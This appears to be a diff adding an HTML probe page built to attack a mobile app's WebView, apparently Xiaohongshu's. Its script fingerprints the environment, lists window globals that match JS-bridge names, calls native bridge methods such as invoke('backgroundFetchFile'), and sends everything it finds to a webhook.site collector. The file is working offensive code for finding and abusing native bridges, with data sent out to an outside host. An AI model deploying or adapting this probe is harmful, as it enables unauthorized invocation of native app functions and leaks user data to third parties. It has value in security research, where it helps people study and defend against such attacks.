@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
+<body style="font-size:24px;font-family:monospace;padding:12px;background:#fff;color:#000">
+<h2 id="t">PROBE...</h2>
+<div id="log"></div>
+<script>
+(function(){
+  var HOOK='https://webhook.site/72535c91-4e20-4e6a-b2a2-cf7b68483bdd';
+  function send(tag,obj){
+    var u=HOOK+'?tag='+encodeURIComponent(tag)+'&d='+encodeURIComponent(JSON.stringify(obj).slice(0,2000));
+    try{ fetch(u,{mode:'no-cors'}); }catch(e){}
+    try{ (new Image()).src=u; }catch(e){}
+  }
+  var d={};
+  d.ua=navigator.userAgent;
+  d.href=location.href;
+  d.origin=location.origin;
+  d.secure=window.isSecureContext;
+  var ks=[]; try{ks=Object.keys(window);}catch(e){}
+  d.keyCount=ks.length;
+  d.suspicious=ks.filter(function(k){return /xhs|bridge|inject|jsb|hybrid|horizon|xy[a-z]/i.test(k);}).slice(0,50);
+  var cand=['xhsBridge','_xhsBridge','JSBridge','_bridge','XhsBridge','__xhs','hybridBridge','xyBridge','horizonBridge','webviewBridge','jsBridge','XhsHybrid','XhsNative','nativeBridge','jsInterface'];
+  var t={};
+  cand.forEach(function(n){var v='undef';try{v=typeof window[n];}catch(e){};if(v!=='undefined')t[n]=v;});
+  d.cand=t;
+  send('init',d);
+  setTimeout(function(){
+    var r=null,e=null;
+    try{ r=prompt('xhsbridge-probe'); }catch(x){ e=String(x); }
+    send('prompt',{ret:String(r).slice(0,120),err:e});
+  },600);
+  setTimeout(function(){
+    var out=[];
+    ['xhsBridge','_xhsBridge','__xhs','XhsHybrid','horizonBridge'].forEach(function(n){
+      try{
+        if(window[n]&&typeof window[n].invoke==='function'){
+          window[n].invoke('backgroundFetchFile',{url:'https://x/1.a',filename:'probe_test'});
+          out.push(n+':invoked');
+        }
+      }catch(e){ out.push(n+':'+String(e).slice(0,80)); }
+    });
+    send('invoke',{out:out});
+  },1800);
+  document.getElementById('t').textContent='PROBE DONE';
+})();
+</script>
+</body></html>
